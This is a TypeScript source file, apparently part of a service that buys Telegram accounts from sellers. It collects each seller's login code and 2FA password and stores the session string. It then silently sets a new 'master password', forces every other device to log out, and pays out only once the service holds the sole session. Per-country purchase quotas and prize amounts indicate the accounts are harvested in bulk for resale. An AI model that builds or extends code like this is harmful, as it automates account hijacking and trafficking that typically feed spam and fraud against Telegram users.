/**
 * Telegram Account Verification and Session Management Workflow
 * 
 * This implements the complete workflow as specified in the diagram:
 * 1. Enter Telegram Number
 * 2. Database Check (Capacity & Sold Status)
 * 3. Send Telegram OTP
 * 4. Verify OTP
 * 5. Check Account Type (Direct Login vs Password Required)
 * 6. Verify Password (if required)
 * 7. Set/Change Master Password in Background
 * 8. Check Active Device Sessions
 * 9. Logout Other Devices (if multiple sessions)
 * 10. Add to Pending List with Country Wait Time
 * 11. Final Session Check after Wait Time
 * 12. Accept/Reject based on Security
 */

import { getCollection, Collections } from '@/lib/mongodb/client'
import { sendOTP, verifyOTP, verify2FA } from './auth'
import { 
  checkActiveSessions, 
  logoutOtherDevices, 
  hasMultipleDevices,
  resetAllAuthorizations 
} from './session-manager'
import { 
  setOrChangeMasterPassword,
  has2FAEnabled 
} from './master-password'

export interface WorkflowResult {
  success: boolean
  step: string
  message: string
  data?: any
  error?: string
}

export interface AccountData {
  phoneNumber: string
  userId: string
  telegramId: number
  sessionString?: string
  status: 'pending' | 'accepted' | 'rejected'
  amount: number
  countryCode?: string
  countryName?: string
}

/**
 * Step 1: Enter Telegram Number + Database Check
 */
export async function checkPhoneNumberEligibility(
  phoneNumber: string,
  telegramId: number
): Promise<WorkflowResult> {
  try {
    console.log(`[Workflow] Step 1: Checking eligibility for ${phoneNumber}`)

    // Validate phone number format
    if (!phoneNumber.startsWith('+') || phoneNumber.length < 10) {
      return {
        success: false,
        step: 'phone_validation',
        message: 'Phone number must include country code (e.g., +1234567890)',
        error: 'INVALID_PHONE_FORMAT',
      }
    }

    const accounts = await getCollection(Collections.ACCOUNTS)
    const users = await getCollection(Collections.USERS)

    // Check if phone number already exists
    const existingAccount = await accounts.findOne({ phone_number: phoneNumber })

    if (existingAccount) {
      const user = await users.findOne({ telegram_id: telegramId })
      
      // Check if it belongs to a different user
      if (user && existingAccount.user_id !== user._id) {
        console.log(`[Workflow] ❌ Phone ${phoneNumber} already sold to another user`)
        return {
          success: false,
          step: 'database_check',
          message: 'This phone number has already been submitted by another user',
          error: 'PHONE_ALREADY_SOLD',
        }
      }

      // Check if same user and already processed
      if (user && existingAccount.user_id === user._id) {
        if (existingAccount.status === 'accepted') {
          return {
            success: false,
            step: 'database_check',
            message: `This phone number has already been accepted. You earned $${existingAccount.amount}!`,
            error: 'PHONE_ALREADY_ACCEPTED',
          }
        } else if (existingAccount.status === 'rejected') {
          return {
            success: false,
            step: 'database_check',
            message: 'This phone number was previously rejected',
            error: 'PHONE_ALREADY_REJECTED',
          }
        }
        // If pending, allow retry
        console.log(`[Workflow] ✅ Phone ${phoneNumber} is pending, allowing retry`)
      }
    }

    // Check country capacity
    const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
    let countryFound = false
    let countryData: any = null

    for (let i = 1; i <= Math.min(4, phoneDigits.length); i++) {
      const possibleCode = phoneDigits.substring(0, i)
      
      const countries = await getCollection(Collections.COUNTRY_CAPACITY)
      const country = await countries.findOne({ 
        $or: [
          { country_code: possibleCode },
          { country_code: `+${possibleCode}` }
        ]
      })
      
      if (country) {
        countryData = country
        const usedCapacity = country.used_capacity || 0
        const maxCapacity = country.max_capacity || 0
        
        if (usedCapacity >= maxCapacity) {
          console.log(`[Workflow] ❌ Capacity full for ${country.country_name}`)
          return {
            success: false,
            step: 'capacity_check',
            message: `Capacity full for ${country.country_name} (${usedCapacity}/${maxCapacity})`,
            error: 'CAPACITY_FULL',
          }
        }
        
        console.log(`[Workflow] ✅ Capacity available for ${country.country_name}`)
        countryFound = true
        break
      }
    }

    return {
      success: true,
      step: 'eligibility_check',
      message: 'Phone number is eligible',
      data: {
        countryData,
        existingAccount,
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in eligibility check:', error)
    return {
      success: false,
      step: 'eligibility_check',
      message: 'Failed to check eligibility',
      error: error.message,
    }
  }
}

/**
 * Step 2-4: Send OTP and Verify
 */
export async function sendAndVerifyOTP(
  phoneNumber: string,
  otpCode?: string,
  phoneCodeHash?: string,
  sessionString?: string
): Promise<WorkflowResult> {
  try {
    // If no OTP provided, send it
    if (!otpCode) {
      console.log(`[Workflow] Step 2: Sending OTP to ${phoneNumber}`)
      const result = await sendOTP(phoneNumber)
      
      if (!result.success) {
        return {
          success: false,
          step: 'send_otp',
          message: result.error || 'Failed to send OTP',
          error: result.error,
        }
      }

      return {
        success: true,
        step: 'send_otp',
        message: 'OTP sent successfully',
        data: {
          phoneCodeHash: result.phoneCodeHash,
          sessionString: result.sessionString,
        },
      }
    }

    // Verify OTP
    console.log(`[Workflow] Step 4: Verifying OTP for ${phoneNumber}`)
    const result = await verifyOTP(phoneNumber, phoneCodeHash!, otpCode, sessionString)

    if (!result.success) {
      if (result.requires2FA) {
        return {
          success: true,
          step: 'otp_verified_needs_2fa',
          message: 'OTP verified, but 2FA password required',
          data: {
            requires2FA: true,
            sessionString: result.sessionString,
          },
        }
      }

      return {
        success: false,
        step: 'verify_otp',
        message: result.error || 'Invalid OTP',
        error: result.error,
      }
    }

    return {
      success: true,
      step: 'otp_verified',
      message: 'OTP verified successfully',
      data: {
        sessionString: result.sessionString,
        userId: result.userId,
        requires2FA: false,
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in OTP flow:', error)
    return {
      success: false,
      step: 'otp_flow',
      message: 'Failed to process OTP',
      error: error.message,
    }
  }
}

/**
 * Step 5-6: Verify 2FA Password (if required)
 */
export async function verify2FAPassword(
  phoneNumber: string,
  sessionString: string,
  password: string
): Promise<WorkflowResult> {
  try {
    console.log(`[Workflow] Step 6: Verifying 2FA password for ${phoneNumber}`)
    
    const result = await verify2FA(phoneNumber, sessionString, password)

    if (!result.success) {
      return {
        success: false,
        step: 'verify_2fa',
        message: result.error || 'Invalid password',
        error: result.error,
      }
    }

    return {
      success: true,
      step: '2fa_verified',
      message: '2FA password verified successfully',
      data: {
        userId: result.userId,
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in 2FA verification:', error)
    return {
      success: false,
      step: 'verify_2fa',
      message: 'Failed to verify 2FA password',
      error: error.message,
    }
  }
}

/**
 * Step 7: Set/Change Master Password in Background
 */
export async function setMasterPasswordBackground(
  sessionString: string,
  currentPassword?: string
): Promise<WorkflowResult> {
  try {
    console.log('[Workflow] Step 7: Setting/Changing master password in background')
    
    const result = await setOrChangeMasterPassword(sessionString, currentPassword)

    if (!result.success) {
      console.error('[Workflow] ❌ Failed to set master password - FAKE ACCOUNT DETECTED')
      return {
        success: false,
        step: 'master_password',
        message: 'Failed to set master password - Account may be fake or restricted',
        error: 'FAKE_ACCOUNT_DETECTED',
      }
    }

    console.log('[Workflow] ✅ Master password set/changed successfully')
    return {
      success: true,
      step: 'master_password',
      message: result.wasChanged ? 'Master password changed' : 'Master password set',
      data: {
        password: result.password,
        wasChanged: result.wasChanged,
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in master password setup:', error)
    return {
      success: false,
      step: 'master_password',
      message: 'Failed to set master password',
      error: error.message,
    }
  }
}

/**
 * Step 8-9: Check Active Sessions and Logout Other Devices
 */
export async function manageDeviceSessions(
  sessionString: string,
  forceLogout: boolean = false
): Promise<WorkflowResult> {
  try {
    console.log('[Workflow] Step 8: Checking active device sessions')
    
    // Check if multiple devices are logged in
    const checkResult = await hasMultipleDevices(sessionString)

    if (!checkResult.success) {
      return {
        success: false,
        step: 'session_check',
        message: 'Failed to check active sessions',
        error: checkResult.error,
      }
    }

    const hasMultiple = checkResult.hasMultiple
    const sessionCount = checkResult.sessionCount

    console.log(`[Workflow] Found ${sessionCount} active sessions`)

    if (!hasMultiple) {
      console.log('[Workflow] ✅ Single device - Proceed normally')
      return {
        success: true,
        step: 'session_check',
        message: 'Single device logged in',
        data: {
          sessionCount,
          hasMultiple: false,
          loggedOutOthers: false,
        },
      }
    }

    // Multiple devices detected
    console.log('[Workflow] ⚠️  Multiple devices detected - Attempting logout')
    
    const logoutResult = forceLogout 
      ? await resetAllAuthorizations(sessionString)
      : await logoutOtherDevices(sessionString)

    if (!logoutResult.success) {
      console.log('[Workflow] ❌ Failed to logout other devices')
      return {
        success: false,
        step: 'logout_devices',
        message: 'Failed to logout other devices - Security risk',
        error: 'SECURITY_RISK_MULTIPLE_SESSIONS',
        data: {
          sessionCount,
          hasMultiple: true,
          loggedOutOthers: false,
        },
      }
    }

    console.log('[Workflow] ✅ Successfully logged out other devices')
    return {
      success: true,
      step: 'logout_devices',
      message: `Logged out ${logoutResult.loggedOutCount || 'all'} other devices`,
      data: {
        sessionCount,
        hasMultiple: true,
        loggedOutOthers: true,
        loggedOutCount: logoutResult.loggedOutCount,
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in session management:', error)
    return {
      success: false,
      step: 'session_management',
      message: 'Failed to manage sessions',
      error: error.message,
    }
  }
}

/**
 * Step 10: Add to Pending List with Country Wait Time
 */
export async function addToPendingList(
  phoneNumber: string,
  telegramId: number,
  sessionString: string,
  userId: string
): Promise<WorkflowResult> {
  try {
    console.log('[Workflow] Step 10: Adding to pending list')
    
    const users = await getCollection(Collections.USERS)
    const accounts = await getCollection(Collections.ACCOUNTS)
    const countries = await getCollection(Collections.COUNTRY_CAPACITY)

    // Get user
    const user = await users.findOne({ telegram_id: telegramId })
    if (!user) {
      return {
        success: false,
        step: 'pending_list',
        message: 'User not found',
        error: 'USER_NOT_FOUND',
      }
    }

    // Detect country and get wait time
    const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
    let waitTimeMinutes = 1440 // Default 24 hours
    let prizeAmount = 0
    let countryName = 'Unknown'
    let countryCode = ''

    for (let i = 1; i <= Math.min(4, phoneDigits.length); i++) {
      const possibleCode = phoneDigits.substring(0, i)
      
      const country = await countries.findOne({ 
        $or: [
          { country_code: possibleCode },
          { country_code: `+${possibleCode}` }
        ]
      })
      
      if (country) {
        waitTimeMinutes = country.auto_approve_minutes || 1440
        prizeAmount = country.prize_amount || 0
        countryName = country.country_name
        countryCode = country.country_code
        console.log(`[Workflow] Country found: ${countryName}, wait time: ${waitTimeMinutes}min, prize: $${prizeAmount}`)
        break
      }
    }

    // Check if account already exists
    const existingAccount = await accounts.findOne({ 
      phone_number: phoneNumber 
    })

    if (existingAccount) {
      // Update existing account
      await accounts.updateOne(
        { _id: existingAccount._id },
        { 
          $set: { 
            session_string: sessionString,
            telegram_user_id: userId,
            updated_at: new Date(),
            wait_time_minutes: waitTimeMinutes,
            country_code: countryCode,
            country_name: countryName,
          }
        }
      )
      
      console.log('[Workflow] ✅ Updated existing account in pending list')
    } else {
      // Create new account
      await accounts.insertOne({
        user_id: user._id,
        phone_number: phoneNumber,
        amount: prizeAmount,
        status: 'pending',
        session_string: sessionString,
        telegram_user_id: userId,
        wait_time_minutes: waitTimeMinutes,
        country_code: countryCode,
        country_name: countryName,
        created_at: new Date(),
        updated_at: new Date(),
      })

      // Increment country capacity
      if (countryCode) {
        await countries.updateOne(
          { country_code: countryCode },
          { 
            $inc: { used_capacity: 1 },
            $set: { updated_at: new Date() }
          }
        )
      }
      
      console.log('[Workflow] ✅ Added new account to pending list')
    }

    return {
      success: true,
      step: 'pending_list',
      message: `Account added to pending list. Wait time: ${waitTimeMinutes} minutes`,
      data: {
        waitTimeMinutes,
        prizeAmount,
        countryName,
        countryCode,
        status: 'pending',
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error adding to pending list:', error)
    return {
      success: false,
      step: 'pending_list',
      message: 'Failed to add to pending list',
      error: error.message,
    }
  }
}

/**
 * Step 11-13: Final Session Check and Accept/Reject
 * This should be run after the wait time has passed
 */
export async function finalSessionCheckAndDecision(
  phoneNumber: string,
  sessionString: string
): Promise<WorkflowResult> {
  try {
    console.log('[Workflow] Step 11: Final session check after wait time')
    
    // Check if multiple devices are still active
    const sessionResult = await hasMultipleDevices(sessionString)

    if (!sessionResult.success) {
      return {
        success: false,
        step: 'final_session_check',
        message: 'Failed to check sessions',
        error: sessionResult.error,
      }
    }

    if (sessionResult.hasMultiple) {
      console.log('[Workflow] ⚠️  Multiple devices still active - Attempting force logout')
      
      // Try force logout one more time
      const logoutResult = await resetAllAuthorizations(sessionString)

      if (!logoutResult.success) {
        console.log('[Workflow] ❌ Failed to logout - REJECTING account for security')
        
        // Reject the account
        const accounts = await getCollection(Collections.ACCOUNTS)
        await accounts.updateOne(
          { phone_number: phoneNumber },
          { 
            $set: { 
              status: 'rejected',
              rejection_reason: 'Multiple active sessions - Security risk',
              rejected_at: new Date(),
              updated_at: new Date(),
            }
          }
        )

        return {
          success: false,
          step: 'final_decision',
          message: 'Account rejected - Multiple active sessions (security risk)',
          error: 'SECURITY_RISK_MULTIPLE_SESSIONS',
          data: {
            decision: 'rejected',
            reason: 'Multiple active sessions',
          },
        }
      }

      console.log('[Workflow] ✅ Successfully logged out all devices')
    }

    // Accept the account
    console.log('[Workflow] ✅ ACCEPTING account - Single device confirmed')
    
    const accounts = await getCollection(Collections.ACCOUNTS)
    const account = await accounts.findOne({ phone_number: phoneNumber })

    if (!account) {
      return {
        success: false,
        step: 'final_decision',
        message: 'Account not found',
        error: 'ACCOUNT_NOT_FOUND',
      }
    }

    await accounts.updateOne(
      { _id: account._id },
      { 
        $set: { 
          status: 'accepted',
          approved_at: new Date(),
          auto_approved: true,
          updated_at: new Date(),
        }
      }
    )

    // Add prize amount to user balance
    if (account.amount && account.amount > 0) {
      const users = await getCollection(Collections.USERS)
      await users.updateOne(
        { _id: account.user_id },
        { $inc: { balance: account.amount } }
      )
      console.log(`[Workflow] ✅ Added $${account.amount} to user balance`)
    }

    return {
      success: true,
      step: 'final_decision',
      message: `Account accepted! Prize: $${account.amount}`,
      data: {
        decision: 'accepted',
        amount: account.amount,
        status: 'accepted',
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in final decision:', error)
    return {
      success: false,
      step: 'final_decision',
      message: 'Failed to make final decision',
      error: error.message,
    }
  }
}

/**
 * Complete Workflow - All Steps Combined
 */
export async function runCompleteVerificationWorkflow(
  phoneNumber: string,
  telegramId: number,
  otpCode: string,
  phoneCodeHash: string,
  sessionString: string,
  password?: string
): Promise<WorkflowResult> {
  try {
    console.log('[Workflow] ========== STARTING COMPLETE VERIFICATION WORKFLOW ==========')
    
    // Step 1: Check eligibility
    const eligibilityResult = await checkPhoneNumberEligibility(phoneNumber, telegramId)
    if (!eligibilityResult.success) {
      return eligibilityResult
    }

    // Step 2-4: OTP already verified (assumed)
    // In real implementation, this would be called separately

    // Step 5-6: Verify 2FA if password provided
    if (password) {
      const passwordResult = await verify2FAPassword(phoneNumber, sessionString, password)
      if (!passwordResult.success) {
        return passwordResult
      }
    }

    // Step 7: Set/Change Master Password in Background
    const masterPasswordResult = await setMasterPasswordBackground(sessionString, password)
    if (!masterPasswordResult.success) {
      return masterPasswordResult
    }

    // Step 8-9: Manage Device Sessions
    const sessionResult = await manageDeviceSessions(sessionString, false)
    if (!sessionResult.success && sessionResult.error === 'SECURITY_RISK_MULTIPLE_SESSIONS') {
      // If we can't manage sessions, reject immediately
      const accounts = await getCollection(Collections.ACCOUNTS)
      await accounts.updateOne(
        { phone_number: phoneNumber },
        { 
          $set: { 
            status: 'rejected',
            rejection_reason: 'Failed to manage multiple sessions',
            rejected_at: new Date(),
          }
        }
      )
      return sessionResult
    }

    // Step 10: Add to Pending List
    const userId = sessionString // Use a proper userId extraction
    const pendingResult = await addToPendingList(phoneNumber, telegramId, sessionString, userId)
    if (!pendingResult.success) {
      return pendingResult
    }

    // Step 11-13: Final check will be done after wait time (via cron job or scheduled task)
    console.log('[Workflow] ========== WORKFLOW COMPLETED - ACCOUNT IN PENDING ==========')

    return {
      success: true,
      step: 'workflow_complete',
      message: `Account verification complete. In pending list for ${pendingResult.data.waitTimeMinutes} minutes`,
      data: {
        ...pendingResult.data,
        masterPassword: masterPasswordResult.data?.password,
        sessionManagement: sessionResult.data,
      },
    }
  } catch (error: any) {
    console.error('[Workflow] Error in complete workflow:', error)
    return {
      success: false,
      step: 'workflow_error',
      message: 'Workflow failed',
      error: error.message,
    }
  }
}
